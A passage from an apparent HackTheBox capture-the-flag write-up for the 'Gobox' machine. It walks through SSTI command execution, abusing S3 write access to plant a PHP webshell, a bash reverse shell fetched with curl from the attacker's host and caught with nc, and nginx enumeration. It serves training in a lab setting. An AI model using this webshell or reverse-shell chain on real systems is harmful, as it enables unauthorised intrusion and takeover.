</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=n>url</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>	<span class=k>except</span> <span class=ne>IndexError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>term</span> <span class=o>=</span> <span class=n>GoboxSSTI</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=k>try</span><span class=p>:</span>	
</span></span><span class=line><span class=cl>		<span class=n>term</span><span class=o>.</span><span class=n>cmdloop</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=k>except</span> <span class=ne>KeyboardInterrupt</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></div><p>Using that wrapper, I have ability to send OS command from my CLI to the compromised container.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «exploits» «10.10.14.97»
</span></span><span class=line><span class=cl>$ python3 ./gobox_ssti.py http://10.10.11.113:8080/forgot/
</span></span><span class=line><span class=cl>&gt; id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
</span></span><span class=line><span class=cl>&gt; uname -a
</span></span><span class=line><span class=cl>Linux aws 5.4.0-81-generic <span class=c1>#91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span></code></pre></div><h3 id=shell-as-www-data>Shell as www-data<a class=anchor aria-hidden=true href=#shell-as-www-data>#</a></h3><h4 id=s3-enumeration>S3 enumeration<a class=anchor aria-hidden=true href=#s3-enumeration>#</a></h4><p>While I was enumerating the installed binary to get a foothold on the container, I found an <code>aws</code> binary.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>&gt; ls -l /usr/bin/aws
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> root root <span class=m>815</span> Jun <span class=m>17</span>  <span class=m>2020</span> /usr/bin/aws
</span></span><span class=line><span class=cl>&gt; aws 
</span></span><span class=line><span class=cl>usage: aws <span class=o>[</span>options<span class=o>]</span> &lt;command&gt; &lt;subcommand&gt; <span class=o>[</span>&lt;subcommand&gt; ...<span class=o>]</span> <span class=o>[</span>parameters<span class=o>]</span>
</span></span><span class=line><span class=cl>To see <span class=nb>help</span> text, you can run:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  aws <span class=nb>help</span>
</span></span><span class=line><span class=cl>  aws &lt;command&gt; <span class=nb>help</span>
</span></span><span class=line><span class=cl>  aws &lt;command&gt; &lt;subcommand&gt; <span class=nb>help</span>
</span></span><span class=line><span class=cl>aws: error: the following arguments are required: <span class=nb>command</span>
</span></span></code></pre></div><p>I will send <code>aws s3 ls</code> to list the available buckets and there is one called <code>website</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>&gt; aws s3 ls
</span></span><span class=line><span class=cl>2021-09-07 07:32:42 website
</span></span></code></pre></div><p>The bucket contains 4 files.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>&gt; aws s3 ls website
</span></span><span class=line><span class=cl>PRE css/
</span></span><span class=line><span class=cl>2021-09-07 07:32:42    <span class=m>1294778</span> bottom.png
</span></span><span class=line><span class=cl>2021-09-07 07:32:42     <span class=m>165551</span> header.png
</span></span><span class=line><span class=cl>2021-09-07 07:32:42          <span class=m>5</span> index.html
</span></span><span class=line><span class=cl>2021-09-07 07:32:42       <span class=m>1803</span> index.php
</span></span></code></pre></div><p>When I read the contents of <code>index.php</code> file, I&rsquo;m sure it&rsquo;s the source code of the homepage (port 80).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>&gt; aws s3 cp s3://website/index.php /tmp/id.php
</span></span><span class=line><span class=cl>download: s3://website/index.php to ../../tmp/id.php<span class=o>)</span> remaining
</span></span><span class=line><span class=cl>&gt; cat /tmp/id.php
</span></span><span class=line><span class=cl>&lt;!DOCTYPE html&gt;
</span></span><span class=line><span class=cl>&lt;htm l <span class=nv>lang</span><span class=o>=</span><span class=s2>&#34;en&#34;</span>&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;head&gt;
</span></span><span class=line><span class=cl>  &lt;meta <span class=nv>charset</span><span class=o>=</span><span class=s2>&#34;UTF-8&#34;</span>&gt;
</span></span><span class=line><span class=cl>  &lt;meta <span class=nv>name</span><span class=o>=</span><span class=s2>&#34;viewport&#34;</span> <span class=nv>content</span><span class=o>=</span><span class=s2>&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
</span></span><span class=line><span class=cl>  &lt;meta http-equiv<span class=o>=</span><span class=s2>&#34;X-UA-Compatible&#34;</span> <span class=nv>content</span><span class=o>=</span><span class=s2>&#34;ie=edge&#34;</span>&gt;
</span></span><span class=line><span class=cl>  &lt;title&gt;Hacking eSports <span class=p>|</span> <span class=o>{{</span>.Title<span class=o>}}</span>&lt;/title&gt;
</span></span><span class=line><span class=cl>  &lt;link <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&#34;</span> <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>id</span><span class=o>=</span><span class=s2>&#34;bootstrap-css&#34;</span>&gt;
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><p>I also find that I have write access on this bucket.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>&gt; <span class=nb>echo</span> <span class=s1>&#39;&lt;?php phpinfo(); ?&gt;&#39;</span> &gt; /tmp/iamf.php
</span></span><span class=line><span class=cl>upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class=o>(</span>s<span class=o>)</span> remaining
</span></span><span class=line><span class=cl>&gt; aws s3 cp /tmp/iamf.php s3://website/
</span></span><span class=line><span class=cl>upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class=o>(</span>s<span class=o>)</span> remaining
</span></span></code></pre></div><p>When I visit back the homepage and append my filename <code>10.10.11.113/iamf.php</code>, it is there and it processes the PHP code.</p><p><div class=img-container><img src=imgs/image-20210908091305043.png alt=image-20210908091305043></div></p><p>Also, instead of <code>Linux aws ...</code> it returns with <code>Linux gobox ...</code>, that means the homepage is hosted in a different system.</p><h4 id=webshell>Webshell<a class=anchor aria-hidden=true href=#webshell>#</a></h4><p>This time I will upload a PHP webshell, but first I will encode the payload with base64 to avoid the bad characters.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «~» «10.10.14.97»
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[f]) ?&gt;&#39;</span> <span class=p>|</span> base64 -w0
</span></span><span class=line><span class=cl>PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg<span class=o>==</span>
</span></span></code></pre></div><p>I will send and transfer that payload to S3 via the RCE wrapper.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>&gt; <span class=nb>echo</span> <span class=s1>&#39;PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg==&#39;</span> <span class=p>|</span> base64 -d &gt; /tmp/iamf-shell.php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&gt; aws s3 cp /tmp/iamf-shell.php s3://website/iamf-shell.php
</span></span><span class=line><span class=cl>upload: ../../tmp/iamf-shell.php to s3://website/iamf-shell.phpg
</span></span></code></pre></div><p>And my webshell is now accessible on the homepage site.</p><p><div class=img-container><img src=imgs/image-20210908163727213.png alt=image-20210908163727213></div></p><h4 id=reverse-shell>Reverse Shell<a class=anchor aria-hidden=true href=#reverse-shell>#</a></h4><p>This system has some Linux binaries that I can use to get a foothold, one of which is <code>curl</code>. First, I will craft my reverse shell script and host it afterwards.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «gobox» «10.10.14.97» 
</span></span><span class=line><span class=cl>$ mkrev tun0 bash <span class=p>|</span> tee exploits/rce.sh
</span></span><span class=line><span class=cl>bash -c <span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.97/53 0&gt;&amp;1&#34;</span>
</span></span></code></pre></div><p>On my webshell, I will grab that script and save it to target&rsquo;s <code>/tmp/</code> dir.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>http://10.10.11.113/iamf-shell.php?f=curl%20-s%20%20http://10.10.14.97:8080/rce.sh%20%20%3E%20/tmp/rce.sh
</span></span></code></pre></div><p>Now I will get my listener ready and execute my reverse shell script.</p><p><div class=img-container><img src=imgs/image-20210908165236310.png alt=image-20210908165236310></div></p><p>On my listener:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «gobox» «10.10.14.97»
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>53</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>53</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.97<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.113<span class=o>]</span> <span class=m>59898</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>770<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>www-data@gobox:/opt/website$
</span></span></code></pre></div><p>I will do the PTY trick and upgrade my shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@gobox:/opt/website$ script /dev/null -c bash
</span></span><span class=line><span class=cl>script /dev/null -c bash
</span></span><span class=line><span class=cl>Script started, file is /dev/null
</span></span><span class=line><span class=cl>www-data@gobox:/opt/website$ ^Z
</span></span><span class=line><span class=cl><span class=o>[</span>2<span class=o>]</span>  + <span class=m>4264</span> suspended  nc -nvlp <span class=m>53</span>
</span></span><span class=line><span class=cl>→ kali@kali «gobox» «10.10.14.97»
</span></span><span class=line><span class=cl>$ stty raw -echo<span class=p>;</span><span class=nb>fg</span>
</span></span><span class=line><span class=cl><span class=o>[</span>2<span class=o>]</span>  - <span class=m>4264</span> continued  nc -nvlp <span class=m>53</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@gobox:/opt/website$ <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span><span class=line><span class=cl>www-data@gobox:/opt/website$ stty cols <span class=m>171</span> rows <span class=m>30</span>
</span></span></code></pre></div><p>It turns out that the user flag is readable by <code>www-data</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@gobox:/$ cat /etc/passwd <span class=p>|</span> grep sh$
</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
</span></span><span class=line><span class=cl>www-data@gobox:/$ ls -lR /home/ubuntu
</span></span><span class=line><span class=cl>/home/ubuntu:
</span></span><span class=line><span class=cl>total <span class=m>4</span>
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root <span class=m>33</span> Aug <span class=m>26</span> 21:10 user.txt
</span></span><span class=line><span class=cl>www-data@gobox:/$ cat /home/ubuntu/user.txt
</span></span><span class=line><span class=cl>d6b91...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4><p>When enumerating the network connections, there are some ports that seem to be missed by my <code>nmap</code> scan (I&rsquo;ll look into this in the <a href=#explore>explore</a> section).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@gobox:/opt$ netstat -tlpn
</span></span><span class=line><span class=cl><span class=o>(</span>Not all processes could be identified, non-owned process info
</span></span><span class=line><span class=cl> will not be shown, you would have to be root to see it all.<span class=o>)</span>
</span></span><span class=line><span class=cl>Active Internet connections <span class=o>(</span>only servers<span class=o>)</span>
</span></span><span class=line><span class=cl>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:9000            0.0.0.0:*               LISTEN      -
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:9001            0.0.0.0:*               LISTEN      -
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:4566            0.0.0.0:*               LISTEN      -
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> :::9000                 :::*                    LISTEN      -
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> :::9001                 :::*                    LISTEN      -
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> :::22                   :::*                    LISTEN
</span></span></code></pre></div><p>I immediately inspected the NGINX configuration file under <code>/etc/nginx/sites-enabled/</code>. There is only one file there called <code>default</code> and it contains the following configurations:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-nginx data-lang=nginx><span class=line><span class=cl><span class=c1># LocalStack that simulates AWS S3
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>server</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kn>listen</span> <span class=mi>4566</span> <span class=s>default_server</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kn>root</span> <span class=s>/var/www/html</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kn>index</span> <span class=s>index.html</span> <span class=s>index.htm</span> <span class=s>index.nginx-debian.html</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kn>server_name</span> <span class=s>_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kn>location</span> <span class=s>/</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=kn>if</span> <span class=s>(</span><span class=nv>$http_authorization</span> <span class=s>!~</span> <span class=s>&#34;(.*)SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz(.*)&#34;)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=kn>return</span> <span class=mi>403</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=kn>proxy_pass</span> <span class=s>http://127.0.0.1:9000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Homepage
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>server</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kn>listen</span> <span class=mi>80</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kn>root</span> <span class=s>/opt/website</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kn>index</span> <span class=s>index.php</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kn>location</span> <span class=p>~</span> <span class=sr>[^/]\.php(/|$)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kn>fastcgi_index</span> <span class=s>index.php</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=kn>fastcgi_param</span> <span class=s>REQUEST_METHOD</span> <span class=nv>$request_method</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=kn>fastcgi_param</span> <span class=s>SCRIPT_FILENAME</span> <span class=nv>$document_root$fastcgi_script_name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=kn>fastcgi_param</span> <span class=s>QUERY_STRING</span> <span class=nv>$query_string</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kn>fastcgi_pass</span> <span class=s>unix:/tmp/php-fpm.sock</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Login page
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>server</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kn>listen</span> <span class=mi>8080</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kn>add_header</span> <span class=s>X-Forwarded-Server</span> <span class=s>golang</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kn>location</span> <span class=s>/</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=kn>proxy_pass</span> <span class=s>http://127.0.0.1:9001</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># unknown
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>server</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kn>listen</span> <span class=n>127.0.0.1</span><span class=p>:</span><span class=mi>8000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kn>location</span> <span class=s>/</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=kn>command</span> <span class=no>on</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Based on the configuration above and the <code>docker-compose.yml</code> file I found under <code>/opt/website/</code>, the server that listens on port 4566 is routed into the internal port 9000 which is mapped into the LocalStack container (host:4566 [with auth]->host:9000->container-localstack:4566).</p><p>To confirm that, I run another scan against port 4566, and <code>nmap</code> shows that it&rsquo;s open, but it&rsquo;s forbidden because there is authorization check.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «gobox» «10.10.14.97»
</span></span><span class=line><span class=cl>$ nmap -sV -sC -p4566 10.10.11.113
</span></span><span class=line><span class=cl>Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-09-08 06:51 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> gobox.htb <span class=o>(</span>10.10.11.113<span class=o>)</span>
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.047s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
</span></span><span class=line><span class=cl>4566/tcp open  http    nginx
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: <span class=m>403</span> Forbidden
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 13.35 seconds
</span></span></code></pre></div><p>Since I know the correct authorization value, I can add it to the authorization header and get access to port 4566.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «gobox» «10.10.14.97»
</span></span><span class=line><span class=cl>$ curl -sv http://10.10.11.113:4566/ -H <span class=s1>&#39;Authorization: Basic SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz&#39;</span>
</span></span><span class=line><span class=cl>*   Trying 10.10.11.113:4566...
</span></span><span class=line><span class=cl>* Connected to 10.10.11.113 <span class=o>(</span>10.10.11.113<span class=o>)</span> port <span class=m>4566</span> <span class=o>(</span><span class=c1>#0)</span>
</span></span><span class=line><span class=cl>&gt; GET / HTTP/1.1
</span></span><span class=line><span class=cl>&gt; Host: 10.10.11.113:4566
</span></span><span class=line><span class=cl>&gt; User-Agent: curl/7.74.0
</span></span><span class=line><span class=cl>&gt; Accept: */*
</span></span><span class=line><span class=cl>&gt; Authorization: Basic SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
</span></span><span class=line><span class=cl>&gt;
</span></span><span class=line><span class=cl>* Mark bundle as not supporting multiuse
</span></span><span class=line><span class=cl>&lt; HTTP/1.1 <span class=m>404</span>
</span></span><span class=line><span class=cl>&lt; Server: nginx
</span></span><span class=line><span class=cl>&lt; Date: Thu, <span class=m>09</span> Sep <span class=m>2021</span> 07:33:54 GMT
</span></span><span class=line><span class=cl>&lt; Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
</span></span><span class=line><span class=cl>&lt; Content-Length: <span class=m>21</span>
</span></span><span class=line><span class=cl>&lt; Connection: keep-alive
</span></span><span class=line><span class=cl>&lt; access-control-allow-origin: *
</span></span><span class=line><span class=cl>&lt; access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
</span></span><span class=line><span class=cl>&lt; access-control-allow-headers: authorization,content-type,content-length,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging,amz-sdk-invocation-id,amz-sdk-request
</span></span><span class=line><span class=cl>&lt; access-control-expose-headers: x-amz-version-id
</span></span><span class=line><span class=cl>&lt;
</span></span><span class=line><span class=cl>* Connection <span class=c1>#0 to host 10.10.11.113 left intact</span>
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;status&#34;</span>: <span class=s2>&#34;running&#34;</span><span class=o>}</span>
</span></span></code></pre></div><p>As for port 80 and 8080, it&rsquo;s clear that they are the homepage and the login page site.</p><p>The next one is request routing for port 8000, this is my first time to see &ldquo;command on&rdquo; written on NGINX&rsquo;s config file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-nginx data-lang=nginx><span class=line><span class=cl><span class=k>server</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kn>listen</span> <span class=n>127.0.0.1</span><span class=p>:</span><span class=mi>8000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kn>location</span> <span class=s>/</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=kn>command</span> <span class=no>on</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>When I try to interact with it, it returns nothing.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@gobox:/opt$ curl -s http://127.0.0.1:8000
</span></span><span class=line><span class=cl>www-data@gobox:/opt$ curl -I http://127.0.0.1:8000
</span></span><span class=line><span class=cl>curl: <span class=o>(</span>52<span class=o>)</span> Empty reply from server
</span></span></code></pre></div><p>With <code>nc</code>, it returns a &ldquo;Bad Request&rdquo;.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@gobox:/$ nc -vn 127.0.0.1 <span class=m>8000</span>
</span></span><span class=line><span class=cl>Connection to 127.0.0.1 <span class=m>8000</span> port <span class=o>[</span>tcp/*<span class=o>]</span> succeeded!
</span></span><span class=line><span class=cl>/
</span></span><span class=line><span class=cl>HTTP/1.1 <span class=m>400</span> Bad Request
</span></span><span class=line><span class=cl>Server: nginx
</span></span><span class=line><span class=cl>Date: Wed, <span class=m>08</span> Sep <span class=m>2021</span> 11:13:48 GMT
</span></span><span class=line><span class=cl>Content-Type: text/html
</span></span><span class=line><span class=cl>Content-Length: <span class=m>150</span>
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;html&gt;
</span></span><span class=line><span class=cl>&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;
</span></span><span class=line><span class=cl>&lt;body&gt;
</span></span><span class=line><span class=cl>&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;
</span></span><span class=line><span class=cl>&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
</span></span><span class=line><span class=cl>&lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span></code></pre></div><p>If I look at the date modified of the NGINX folder, there are 6 folders that were modified on August 26 at the same time.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@gobox:/etc/nginx$ ls -lt
</span></span><span class=line><span class=cl>total <span class=m>64</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> root root <span class=m>4096</span> Aug <span class=m>26</span> 21:26 snippets
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> root root <span class=m>4096</span> Aug <span class=m>26</span> 21:26 sites-available
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> root root <span class=m>4096</span> Aug <span class=m>26</span> 21:26 sites-enabled
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> root root <span class=m>4096</span> Aug <span class=m>26</span> 21:26 modules-enabled
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> root root <span class=m>4096</span> Aug <span class=m>26</span> 21:26 conf.d
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> root root <span class=m>4096</span> Aug <span class=m>26</span> 21:26 modules-available
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root <span class=m>1484</span> Aug <span class=m>24</span> 20:30 nginx.conf
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root <span class=m>3071</span> Feb  <span class=m>4</span>  <span class=m>2019</span> win-utf
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root <span class=m>1077</span> Feb  <span class=m>4</span>  <span class=m>2019</span> fastcgi.conf
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root <span class=m>1007</span> Feb  <span class=m>4</span>  <span class=m>2019</span> fastcgi_params
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root <span class=m>2837</span> Feb  <span class=m>4</span>  <span class=m>2019</span> koi-utf
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root <span class=m>2223</span> Feb  <span class=m>4</span>  <span class=m>2019</span> koi-win
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root <span class=m>3957</span> Feb  <span class=m>4</span>  <span class=m>2019</span> mime.types
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root  <span class=m>180</span> Feb  <span class=m>4</span>  <span class=m>2019</span> proxy_params
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root  <span class=m>636</span> Feb  <span class=m>4</span>  <span class=m>2019</span> scgi_params
